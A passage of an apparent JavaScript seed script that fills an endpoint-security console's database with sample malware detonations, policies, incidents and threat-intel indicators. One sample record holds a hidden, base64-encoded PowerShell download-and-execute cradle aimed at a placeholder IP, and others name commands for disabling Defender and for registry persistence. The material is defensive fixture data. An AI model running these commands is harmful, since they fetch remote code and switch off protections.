      'C:\\Tools\\procdump64.exe',
      6291456,
      'COMPLETED',
      'SUSPICIOUS',
      55,
      'WIN11_SANDBOX_SECURE',
      30,
      JSON.stringify(['Credential Access', 'Discovery']),
      'NONE'
    );

    const insertNode = db.prepare(`
      INSERT OR IGNORE INTO process_lineage_nodes (
        id, detonation_id, device_id, hostname, process_id, parent_process_id,
        process_name, parent_process_name, command_line, executable_path, sha256_hash,
        integrity_level, user_sid, spawned_at, terminated_at, is_anomalous, anomaly_reasons_json
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-2 hours'), DATETIME('now', '-1 hour'), ?, ?)
    `);

    insertNode.run(
      'pln-node-01',
      'det-sample-qakbot',
      devId,
      devHost,
      1840,
      800,
      'explorer.exe',
      'userinit.exe',
      'C:\\Windows\\Explorer.EXE',
      'C:\\Windows\\explorer.exe',
      '4a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b',
      'MEDIUM',
      'S-1-5-21-3920194-1001',
      0,
      '[]'
    );

    insertNode.run(
      'pln-node-02',
      'det-sample-qakbot',
      devId,
      devHost,
      4920,
      1840,
      'invoice_oct_report.exe',
      'explorer.exe',
      '"C:\\Users\\Family\\Downloads\\invoice_oct_report.exe"',
      'C:\\Users\\Family\\Downloads\\invoice_oct_report.exe',
      '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae',
      'MEDIUM',
      'S-1-5-21-3920194-1001',
      1,
      JSON.stringify(['Masquerading as PDF document', 'Unsigned binary executing from Downloads folder'])
    );

    insertNode.run(
      'pln-node-03',
      'det-sample-qakbot',
      devId,
      devHost,
      6104,
      4920,
      'powershell.exe',
      'invoice_oct_report.exe',
      'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANAAyAC8AYgBlAGEAYwBvAG4ALgBwAHMAMQAiACkA',
      'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      '9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b',
      'MEDIUM',
      'S-1-5-21-3920194-1001',
      1,
      JSON.stringify(['Hidden window mode execution', 'Base64 encoded payload download cradle'])
    );

    const insertEvent = db.prepare(`
      INSERT OR IGNORE INTO behavioral_telemetry_events (
        id, detonation_id, process_id, process_name, event_category, event_action,
        target_object, details_json, severity, mitre_technique, timestamp
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-90 minutes'))
    `);

    insertEvent.run(
      'bte-ev-01',
      'det-sample-qakbot',
      4920,
      'invoice_oct_report.exe',
      'PROCESS_INJECTION',
      'NtWriteVirtualMemory',
      'Target PID 1840 (explorer.exe)',
      JSON.stringify({ address: '0x00007FF728B40000', size_bytes: 4096, protection: 'PAGE_EXECUTE_READWRITE' }),
      'CRITICAL',
      'T1055'
    );

    insertEvent.run(
      'bte-ev-02',
      'det-sample-qakbot',
      6104,
      'powershell.exe',
      'C2_NETWORK_BEACON',
      'TcpConnect',
      '198.51.100.42:443',
      JSON.stringify({ remote_ip: '198.51.100.42', remote_port: 443, protocol: 'HTTPS', tls_ja3_fingerprint: 'e7d705a3286e19ea42f587b344ee6865' }),
      'CRITICAL',
      'T1071.001'
    );

    insertEvent.run(
      'bte-ev-03',
      'det-sample-qakbot',
      4920,
      'invoice_oct_report.exe',
      'REGISTRY_PERSISTENCE',
      'RegSetValueEx',
      'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityAssistant',
      JSON.stringify({ value_name: 'SecurityAssistant', data: 'C:\\ProgramData\\SecurityService.exe' }),
      'HIGH',
      'T1547.001'
    );
  }
  // 48. Seed Web Content Filtering & SmartScreen Policies
  const wcfCount = db.prepare('SELECT COUNT(*) as count FROM web_content_filtering_policies').get().count;
  if (wcfCount === 0) {
    const insertWcf = db.prepare(`
      INSERT OR IGNORE INTO web_content_filtering_policies (
        id, name, description, target_scope, target_id, block_adult_content, block_high_liability,
        block_legal_liability, block_bandwidth_loss, block_unrated, smartscreen_mode,
        allow_user_bypass, network_protection_mode, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertWcf.run(
      'wcf-enterprise-strict',
      'Enterprise Strict Web Protection & SmartScreen Baseline',
      'Blocks Adult, High Liability, Legal Liability, and unapproved P2P categories with zero bypass.',
      'ALL_FLEET',
      null,
      1, 1, 1, 1, 0,
      'BLOCK',
      0,
      'BLOCK',
      1
    );

    insertWcf.run(
      'wcf-developer-balanced',
      'Developer Workstation Balanced Web Filter',
      'Permits liability research while strictly blocking phishing domains and malicious drops.',
      'DYNAMIC_GROUP',
      'grp-workstations',
      1, 1, 0, 0, 0,
      'WARN',
      1,
      'BLOCK',
      1
    );

    const insertIndicator = db.prepare(`
      INSERT OR IGNORE INTO web_indicator_rules (
        id, policy_id, indicator_type, indicator_value, action, category, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertIndicator.run('wir-block-phish-domain', 'wcf-enterprise-strict', 'DOMAIN', 'secure-login-attempt-verify.com', 'BLOCK', 'Phishing & Credential Theft', 1);
    insertIndicator.run('wir-block-c2-ip', 'wcf-enterprise-strict', 'IP_ADDRESS', '198.51.100.99', 'BLOCK', 'Malware C2 Gateway', 1);
    insertIndicator.run('wir-allow-corp-portal', 'wcf-enterprise-strict', 'DOMAIN', 'localpilot.internal', 'ALLOW', 'Internal Corporate Portal', 1);

    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (sampleDevice) {
      const insertWpae = db.prepare(`
        INSERT OR IGNORE INTO web_protection_audit_events (
          id, device_id, hostname, username, event_type, url, domain, ip_address, category,
          action_taken, browser_process, severity, timestamp
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-30 minutes'))
      `);

      insertWpae.run(
        'wpae-01',
        sampleDevice.id,
        sampleDevice.hostname,
        'Tony',
        'PHISHING_ATTEMPT_DETECTED',
        'https://secure-login-attempt-verify.com/auth/login.html',
        'secure-login-attempt-verify.com',
        '198.51.100.99',
        'Phishing & Credential Theft',
        'BLOCKED',
        'msedge.exe',
        'CRITICAL'
      );

      insertWpae.run(
        'wpae-02',
        sampleDevice.id,
        sampleDevice.hostname,
        'Tony',
        'URL_BLOCKED',
        'https://gambling-poker-betting.net/games',
        'gambling-poker-betting.net',
        '203.0.113.55',
        'High Liability',
        'BLOCKED',
        'chrome.exe',
        'MEDIUM'
      );
    }
  }
  // 49. Seed USB & Peripheral Device Control Policies and Exceptions
  const usbCount = db.prepare('SELECT COUNT(*) as count FROM usb_device_control_policies').get().count;
  if (usbCount === 0) {
    const insertUsbPolicy = db.prepare(`
      INSERT OR IGNORE INTO usb_device_control_policies (
        id, name, description, target_scope, target_id, removable_storage_access,
        bluetooth_mode, printer_protection_mode, audit_level, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertUsbPolicy.run(
      'usb-pol-corp-baseline',
      'Corporate Strict Removable Storage Baseline',
      'Enforces Read-Only on unauthorized USB flash drives and audits all external file transfer operations.',
      'ALL_FLEET',
      null,
      'READ_ONLY',
      'RESTRICTED',
      'AUDIT',
      'DETAILED',
      1
    );

    insertUsbPolicy.run(
      'usb-pol-airgap',
      'High Security Airgap Zero-Trust USB Policy',
      'Completely blocks all removable mass storage and disables unauthorized Bluetooth adapters.',
      'DYNAMIC_GROUP',
      'grp-high-security',
      'BLOCK',
      'DISABLED',
      'BLOCK',
      'DETAILED',
      1
    );

    const insertUsbException = db.prepare(`
      INSERT OR IGNORE INTO usb_device_exceptions (
        id, policy_id, friendly_name, vendor_id, product_id, serial_number, device_interface_id, action, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertUsbException.run(
      'usb-exc-sandisk-it',
      'usb-pol-corp-baseline',
      'IT Department BitLocker Encrypted SanDisk USB',
      '0781',
      '5583',
      'SD-IT-88410294',
      null,
      'ALLOW',
      1
    );

    insertUsbException.run(
      'usb-exc-yubikey',
      'usb-pol-corp-baseline',
      'Corporate Hardware Security Key (YubiKey 5)',
      '1050',
      '0407',
      null,
      null,
      'ALLOW',
      1
    );

    insertUsbException.run(
      'usb-exc-blocked-unbranded',
      'usb-pol-corp-baseline',
      'Untrusted Cloned Mass Storage Flash Drive',
      '058f',
      '6387',
      null,
      null,
      'BLOCK',
      1
    );

    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (sampleDevice) {
      const insertPae = db.prepare(`
        INSERT OR IGNORE INTO peripheral_audit_events (
          id, device_id, hostname, username, event_type, device_name, hardware_id,
          serial_number, action_taken, process_name, file_path, details, severity, timestamp
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-15 minutes'))
      `);

      insertPae.run(
        'pae-01',
        sampleDevice.id,
        sampleDevice.hostname,
        'Tony',
        'WRITE_BLOCKED',
        'SanDisk Cruzer Glide USB Device',
        'USB\\VID_0781&PID_5567',
        '4C530001280922119102',
        'BLOCKED',
        'explorer.exe',
        'E:\\payroll_2026_confidential.xlsx',
        JSON.stringify({ reason: 'Removable storage write denied by corporate policy', capacity_mb: 16000 }),
        'HIGH'
      );

      insertPae.run(
        'pae-02',
        sampleDevice.id,
        sampleDevice.hostname,
        'Tony',
        'USB_ATTACH',
        'Kingston DataTraveler 3.0',
        'USB\\VID_0951&PID_1666',
        '001CC0EC34F3BC11A9380029',
        'AUDITED',
        'System',
        null,
        JSON.stringify({ bus: 'USB 3.0', capacity_mb: 32000, volume_guid: '{694b8e5c-0000-0000-0000-100000000000}' }),
        'INFO'
      );
    }
  }
  // 50. Seed Tamper Protection & Antivirus Exclusion Governance Baselines
  const tamperCount = db.prepare('SELECT COUNT(*) as count FROM tamper_protection_policies').get().count;
  if (tamperCount === 0) {
    const insertTamper = db.prepare(`
      INSERT OR IGNORE INTO tamper_protection_policies (
        id, name, description, target_scope, target_id, tamper_protection_state,
        lock_security_services, protect_antivirus_exclusions, prevent_safe_mode_bypass, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertTamper.run(
      'tpp-enterprise-strict',
      'Enterprise Strict Tamper & Anti-Snooping Baseline',
      'Locks WinDefend and Sense services, prevents unauthorized registry disablement, and denies local exclusion injection.',
      'ALL_FLEET',
      null,
      'ENFORCED',
      1,
      1,
      1,
      1
    );

    insertTamper.run(
      'tpp-developer-monitored',
      'Developer Workstation Monitored Tamper Policy',
      'Monitors exclusion changes and audits security service termination attempts without hard blocking dev runtimes.',
      'DYNAMIC_GROUP',
      'grp-workstations',
      'AUDIT_ONLY',
      1,
      0,
      0,
      1
    );

    const insertExclusion = db.prepare(`
      INSERT OR IGNORE INTO antivirus_exclusion_rules (
        id, policy_id, exclusion_type, exclusion_value, risk_tier, justification, approved_by, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertExclusion.run(
      'aver-git-path',
      'tpp-enterprise-strict',
      'PATH',
      'C:\\Program Files\\Git\\bin\\git.exe',
      'LOW',
      'Developer tooling performance optimization for git version control operations.',
      'SecOps Lead',
      1
    );

    insertExclusion.run(
      'aver-cargo-cache',
      'tpp-enterprise-strict',
      'FOLDER',
      'C:\\Users\\*\\.cargo\\registry',
      'LOW',
      'Rust build cache directory to prevent disk I/O scan storms during compiling.',
      'Architecture Review Board',
      1
    );

    insertExclusion.run(
      'aver-high-risk-temp',
      'tpp-enterprise-strict',
      'FOLDER',
      'C:\\temp\\unins000',
      'HIGH',
      'Legacy installer scratch area flagged for mandatory quarterly security audit.',
      'SecOps Auditor',
      1
    );

    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (sampleDevice) {
      const insertTae = db.prepare(`
        INSERT OR IGNORE INTO tamper_audit_events (
          id, device_id, hostname, username, event_type, target_resource,
          attacker_process, action_taken, details, severity, timestamp
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-20 minutes'))
      `);

      insertTae.run(
        'tae-01',
        sampleDevice.id,
        sampleDevice.hostname,
        'SYSTEM',
        'REGISTRY_TAMPER_ATTEMPT',
        'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware',
        'powershell.exe -enc SQBFAFgA...',
        'BLOCKED',
        JSON.stringify({ prevented_value: 1, call_stack: 'ntdll!NtSetValueKey -> kernelbase!RegSetValueExW' }),
        'CRITICAL'
      );

      insertTae.run(
        'tae-02',
        sampleDevice.id,
        sampleDevice.hostname,
        'Tony',
        'UNAUTHORIZED_EXCLUSION_INJECTED',
        'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Windows\\Temp',
        'cmd.exe',
        'RESTORED',
        JSON.stringify({ injected_path: 'C:\\Windows\\Temp', remediation: 'Auto-reverted by Tamper Protection Engine' }),
        'HIGH'
      );
    }
  }
  // 51. Seed Network Isolation & Host Quarantine Governance Baselines (Iteration 51)
  const quarantineCount = db.prepare('SELECT COUNT(*) as count FROM network_isolation_policies').get().count;
  if (quarantineCount === 0) {
    const insertIsoPolicy = db.prepare(`
      INSERT OR IGNORE INTO network_isolation_policies (
        id, name, description, target_scope, target_id, isolation_mode,
        allow_dns, allow_dhcp, allow_fleet_telemetry, honeypot_redirect_ip, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertIsoPolicy.run(
      'nip-enterprise-containment',
      'Enterprise Strict Host Quarantine Baseline',
      'Enforces total network isolation via WFP while maintaining LocalPilot Fleet management & DNS/DHCP lease renewal.',
      'ALL_FLEET',
      null,
      'SELECTIVE_MANAGEMENT',
      1,
      1,
      1,
      null,
      1
    );

    insertIsoPolicy.run(
      'nip-airgap-lockdown',
      'Airgap Complete Disconnect Isolation',
      'Completely drops 100% of all IPv4/IPv6 inbound and outbound traffic with zero exceptions for high-consequence containment.',
      'DYNAMIC_GROUP',
      'grp-critical-infrastructure',
      'FULL_DISCONNECT',
      0,
      0,
      0,
      null,
      1
    );

    const insertExclusionEndpoint = db.prepare(`
      INSERT OR IGNORE INTO isolation_exclusion_endpoints (
        id, policy_id, friendly_name, endpoint_type, endpoint_value, direction, port, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertExclusionEndpoint.run(
      'iee-fleet-server',
      'nip-enterprise-containment',
      'LocalPilot Fleet On-Premises Server',
      'IP_ADDRESS',
      '127.0.0.1',
      'BOTH',
      8443,
      1
    );

    insertExclusionEndpoint.run(
      'iee-cloudflare-tunnel',
      'nip-enterprise-containment',
      'Cloudflare Zero Trust Edge Ingress Gateway',
      'CIDR_SUBNET',
      '198.41.128.0/17',
      'OUTBOUND',
      443,
      1
    );

    insertExclusionEndpoint.run(
      'iee-soc-siem',
      'nip-enterprise-containment',
      'Enterprise SOC Syslog Collector',
      'IP_ADDRESS',
      '10.0.0.50',
      'OUTBOUND',
      514,
      1
    );

    const sampleDevice = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (sampleDevice) {
      const insertIal = db.prepare(`
        INSERT OR IGNORE INTO isolation_audit_logs (
          id, device_id, hostname, transition_type, initiated_by, reason,
          packet_summary, details, severity, timestamp
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-25 minutes'))
      `);

      insertIal.run(
        'ial-01',
        sampleDevice.id,
        sampleDevice.hostname,
        'HOST_ISOLATED',
        'IncidentResponsePlaybook #7',
        'Active C2 beacon detected by EDR process lineage engine',
        'WFP rules engaged: Inbound=DROP_ALL, Outbound=ALLOW_FLEET_ONLY',
        JSON.stringify({ c2_dest: '198.51.100.99:443', process: 'invoice_oct_report.exe' }),
        'CRITICAL'
      );

      insertIal.run(
        'ial-02',
        sampleDevice.id,
        sampleDevice.hostname,
        'UNAUTHORIZED_TRAFFIC_DROPPED',
        'Windows Filtering Platform (WFP)',
        'Outbound TCP connection dropped during host containment',
        'TCP 10.0.1.20:49210 -> 203.0.113.88:445 [DROPPED]',
        JSON.stringify({ target_port: 445, protocol: 'SMB', direction: 'OUTBOUND' }),
        'HIGH'
      );
    }

  }

  // 52. Seed Custom Remediation Packages & Live Response (Iteration 52)
  const remediationCount = db.prepare('SELECT COUNT(*) as count FROM custom_remediation_packages').get().count;
  if (remediationCount === 0) {
    const insertCrp = db.prepare(`
      INSERT OR IGNORE INTO custom_remediation_packages (
        id, name, description, category, target_scope, target_id,
        detection_script, remediation_script, script_type, execution_timeout,
        run_frequency, run_as_account, enforce_signature_check, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertCrp.run(
      'crp-printspooler',
      'Auto-Remediate PrintSpooler Remote Execution Vulnerability',
      'Detects if the legacy Print Spooler service is running on workstations and automatically stops/disables it.',
      'SECURITY_HARDENING',
      'ALL_FLEET',
      null,
      '\$svc = Get-Service -Name Spooler -ErrorAction SilentlyContinue; if (\$svc.StartType -ne "Disabled") { exit 1 } else { exit 0 }',
      'Stop-Service -Name Spooler -Force -ErrorAction SilentlyContinue; Set-Service -Name Spooler -StartupType Disabled; Write-Output "Print Spooler disabled."',
      'POWERSHELL',
      180,
      'DAILY',
      'SYSTEM',
      0,
      1
    );

    insertCrp.run(
      'crp-temp-prune',
      'Automated System Temp & Crash Dump Sanitizer',
      'Checks if temporary user and system folders exceed 1GB and performs automated safe cleanup.',
      'SYSTEM_HEALTH',
      'ALL_FLEET',
      null,
      '\$size = (Get-ChildItem -Path \$env:TEMP -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum; if (\$size -gt 1073741824) { exit 1 } else { exit 0 }',
      'Remove-Item -Path "\$env:TEMP\\*" -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "Stale temporary files purged."',
      'POWERSHELL',
      300,
      'WEEKLY',
      'SYSTEM',
      0,
      1
    );

    insertCrp.run(
      'crp-guest-account',
      'Disable Built-In Windows Guest Account',
      'Ensures the default local Guest account is permanently disabled to meet CIS benchmarks.',
      'CONFIG_DRIFT',
      'ALL_FLEET',
      null,
      '\$guest = Get-LocalUser -Name "Guest" -ErrorAction SilentlyContinue; if (\$guest.Enabled) { exit 1 } else { exit 0 }',
      'Disable-LocalUser -Name "Guest"; Write-Output "CIS Benchmark: Guest user account disabled."',
      'POWERSHELL',
      120,
      'DAILY',
      'SYSTEM',
      0,
      1
    );

    const devTarget = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (devTarget) {
      const insertLrcs = db.prepare(`
        INSERT OR IGNORE INTO live_response_command_sessions (
          id, session_id, device_id, hostname, operator, command_type,
          command_payload, status, output, exit_code, duration_ms, completed_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-10 minutes'))
      `);

      insertLrcs.run(
        'lrc-01',
        'lrs-session-77',
        devTarget.id,
        devTarget.hostname,
        'SecOps Lead Analyst',
        'LIST_DIRECTORY',
        'C:\\Windows\\System32\\drivers\\etc',
        'COMPLETED',
        'hosts\r\nlmhosts.sam\r\nnetworks\r\nprotocol\r\nservices',
        0,
        145
      );

      insertLrcs.run(
        'lrc-02',
        'lrs-session-77',
        devTarget.id,
        devTarget.hostname,
        'SecOps Lead Analyst',
        'EXEC_POWERSHELL',
        'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 ProcessName,Id,CPU',
        'COMPLETED',
        'ProcessName Id CPU\n----------- -- ---\nSystem 4 214.5\nLocalPilotAgent 3480 45.2',
        0,
        320
      );

      insertLrcs.run(
        'lrc-03',
        'lrs-session-77',
        devTarget.id,
        devTarget.hostname,
        'SecOps Lead Analyst',
        'TERMINATE_PROCESS',
        'pid:9944 /name:suspicious_miner.exe',
        'QUEUED',
        null,
        null,
        null
      );

      const insertQfi = db.prepare(`
        INSERT OR IGNORE INTO quarantined_files_inventory (
          id, device_id, hostname, original_path, file_name,
          sha256_hash, file_size_bytes, threat_name, quarantined_by,
          quarantine_vault_path, status, notes
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `);

      insertQfi.run(
        'qfi-01',
        devTarget.id,
        devTarget.hostname,
        'C:\\Users\\Tony\\Downloads\\mimikatz_trunk.zip',
        'mimikatz_trunk.zip',
        'a35b88c7d91e4f501867c2934098492083419082340918230914820934812093',
        1428500,
        'HackTool:Win32/Mimikatz.A!dha',
        'IncidentResponseBot',
        'C:\\ProgramData\\LocalPilotFleet\\Quarantine\\a35b88c7d91e4f50.vault',
        'QUARANTINED',
        'Automated quarantine triggered by memory injection detection'
      );

      insertQfi.run(
        'qfi-02',
        devTarget.id,
        devTarget.hostname,
        'C:\\Windows\\Temp\\invoice_oct_macro.xlsm',
        'invoice_oct_macro.xlsm',
        'f6b7891234567890abcdef1234567890abcdef1234567890abcdef1234567890',
        48920,
        'TrojanDownloader:O97M/Donoff',
        'SecOps Analyst',
        'C:\\ProgramData\\LocalPilotFleet\\Quarantine\\f6b7891234567890.vault',
        'QUARANTINED',
        'Obfuscated VBA macro auto-dropped payload'
      );
    }

  }

  // 53. Seed EDR Incident Correlation & Attack Storylines (Iteration 53)
  const incidentCount = db.prepare('SELECT COUNT(*) as count FROM incident_investigation_cases').get().count;
  if (incidentCount === 0) {
    const devTarget = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (devTarget) {
      const insertInc = db.prepare(`
        INSERT OR IGNORE INTO incident_investigation_cases (
          id, title, description, severity, status, classification,
          risk_score, primary_device_id, primary_hostname, assigned_analyst,
          root_cause, attack_storyline_json, mitre_tactics_json, created_at, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-45 minutes'), DATETIME('now', '-5 minutes'))
      `);

      const storyline = JSON.stringify([
        { id: "node-1", phase: "INITIAL_ACCESS", title: "Phishing attachment delivered", detail: "invoice_oct_macro.xlsm opened in Excel" },
        { id: "node-2", phase: "EXECUTION", title: "VBA macro spawned PowerShell", detail: "powershell.exe -enc <base64 payload>" },
        { id: "node-3", phase: "DEFENSE_EVASION", title: "Tamper Protection tripped", detail: "Set-MpPreference -DisableRealtimeMonitoring attempt blocked" },
        { id: "node-4", phase: "REMEDIATION", title: "Host Network Isolation Engaged", detail: "WFP containment rule active" }
      ]);

      const tactics = JSON.stringify(["Initial Access", "Execution", "Defense Evasion", "Command and Control"]);

      insertInc.run(
        'inc-2026-001',
        'Multi-Stage Macro Execution & Lateral Movement Attempt',
        'Malicious Excel macro downloaded staging dropper, attempted AV tamper bypass, triggered host isolation.',
        'HIGH',
        'ACTIVE',
        'TRUE_POSITIVE',
        88,
        devTarget.id,
        devTarget.hostname,
        'Lead SOC Analyst Sarah',
        'Phishing email containing weaponized spreadsheet invoice_oct_macro.xlsm',
        storyline,
        tactics
      );

      const insertIaa = db.prepare(`
        INSERT OR IGNORE INTO incident_alert_associations (
          id, incident_id, alert_source, alert_id, alert_summary, associated_at
        ) VALUES (?, ?, ?, ?, ?, DATETIME('now', '-40 minutes'))
      `);

      insertIaa.run('iaa-01', 'inc-2026-001', 'QUARANTINE_INVENTORY', 'qfi-02', 'TrojanDownloader:O97M/Donoff macro quarantined');
      insertIaa.run('iaa-02', 'inc-2026-001', 'TAMPER_AUDIT', 'tae-01', 'Unauthorized PowerShell registry disable attempt intercepted');
      insertIaa.run('iaa-03', 'inc-2026-001', 'ISOLATION_LOGS', 'ial-01', 'Host network quarantine engaged by automated playbook');

      const insertItm = db.prepare(`
        INSERT OR IGNORE INTO incident_timeline_milestones (
          id, incident_id, phase_name, milestone_title, details, evidence_artifact, mitre_technique_id, occurred_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-42 minutes'))
      `);

      insertItm.run('itm-01', 'inc-2026-001', 'INITIAL_ACCESS', 'Weaponized spreadsheet opened', 'User opened invoice_oct_macro.xlsm from Outlook', 'invoice_oct_macro.xlsm', 'T1566.001');
      insertItm.run('itm-02', 'inc-2026-001', 'EXECUTION', 'PowerShell payload executed', 'VBA shell command executed hidden PowerShell script', 'powershell.exe -enc ...', 'T1059.001');
      insertItm.run('itm-03', 'inc-2026-001', 'DEFENSE_EVASION', 'Defender RTP tampering attempted', 'Attempted to stop WinDefend service and disable RTP', 'Set-MpPreference -DisableRealtimeMonitoring', 'T1562.001');
      insertItm.run('itm-04', 'inc-2026-001', 'REMEDIATION', 'Automated Containment & Isolation', 'Endpoint contained via WFP firewall isolation rule', 'WFP_CONTAIN_ALL', 'T1036');
    }
  }




  // 54. Seed Threat Intelligence Feeds & Cached Indicators (Iteration 54)
  const tiCount = db.prepare('SELECT COUNT(*) as count FROM threat_intel_feed_sources').get().count;
  if (tiCount === 0) {
    const insertTifs = db.prepare(`
      INSERT OR IGNORE INTO threat_intel_feed_sources (
        id, name, feed_url, feed_format, poll_interval_hours,
        confidence_weight, default_action, indicator_count,
        last_sync_status, last_sync_time, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-1 hour'), 1)
    `);

    insertTifs.run('tif-alienvault', 'AlienVault OTX High-Confidence C2 Pulses', 'https://otx.alienvault.com/api/v1/pulses/subscribed', 'STIX_TAXII_21', 6, 90, 'BLOCK', 1450, 'SUCCESS');
    insertTifs.run('tif-abuseipdb', 'AbuseIPDB Verified Blacklist (Confidence > 95%)', 'https://api.abuseipdb.com/api/v2/blacklist', 'ABUSE_IPDB', 4, 95, 'BLOCK', 850, 'SUCCESS');
    insertTifs.run('tif-urlhaus', 'URLhaus Malicious Payload Distribution Feed', 'https://urlhaus.abuse.ch/downloads/json/recent/', 'URLHAUS_JSON', 2, 88, 'BLOCK', 420, 'SUCCESS');

    const insertTiic = db.prepare(`
      INSERT OR IGNORE INTO threat_intel_indicators_cache (
        id, feed_id, indicator_type, indicator_value, threat_type,
        confidence_score, severity, description, mitre_techniques, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
    `);

    insertTiic.run('tiic-01', 'tif-abuseipdb', 'IPV4_ADDRESS', '198.51.100.99', 'C2_BEACON', 98, 'CRITICAL', 'Active Cobalt Strike command-and-control listener', 'T1071.001,T1573');
    insertTiic.run('tiic-02', 'tif-urlhaus', 'DOMAIN_FQDN', 'updates-cdn-auth.com', 'PHISHING', 92, 'HIGH', 'Credential harvesting gateway impersonating SSO portal', 'T1566.002');
    insertTiic.run('tiic-03', 'tif-alienvault', 'SHA256_HASH', 'a35b88c7d91e4f501867c2934098492083419082340918230914820934812093', 'MALWARE', 99, 'CRITICAL', 'Known Mimikatz credential dumping utility artifact', 'T1003.001');

    const devTarget = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (devTarget) {
      const insertTime = db.prepare(`
        INSERT OR IGNORE INTO threat_intel_match_events (
          id, device_id, hostname, indicator_id, indicator_type,
          matched_value, source_context, action_taken, severity, timestamp, details
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-20 minutes'), ?)
      `);

      insertTime.run(
        'time-01',
        devTarget.id,
        devTarget.hostname,
        'tiic-01',
        'IPV4_ADDRESS',
        '198.51.100.99',
        'TCP outbound: curl.exe -> 198.51.100.99:443',
        'BLOCKED',
        'CRITICAL',
        'Outbound connection to Cobalt Strike C2 dropped by LocalPilot Threat Intel Filter'
      );
    }
  }


  // 55. Seed Threat & Vulnerability Management (TVM) (Iteration 55)
  const tvmCount = db.prepare('SELECT COUNT(*) as count FROM cve_vulnerabilities_catalog').get().count;
  if (tvmCount === 0) {
    const insertCvc = db.prepare(`
      INSERT OR IGNORE INTO cve_vulnerabilities_catalog (
        cve_id, title, description, cvss_score, severity,
        affected_vendor, affected_product, fixed_version,
        exploit_maturity, epss_score, cisa_kev, published_date
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-30 days'))
    `);

    insertCvc.run(
      'CVE-2024-38077',
      'Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability (MadLicense)',
      'Unauthenticated RCE vulnerability in Windows Remote Desktop Licensing service allowing full SYSTEM takeover.',
      9.8,
      'CRITICAL',
      'Microsoft',
      'Windows Remote Desktop Services',
      'KB5040442',
      'ACTIVE_IN_THE_WILD',
      0.89,
      1
    );

    insertCvc.run(
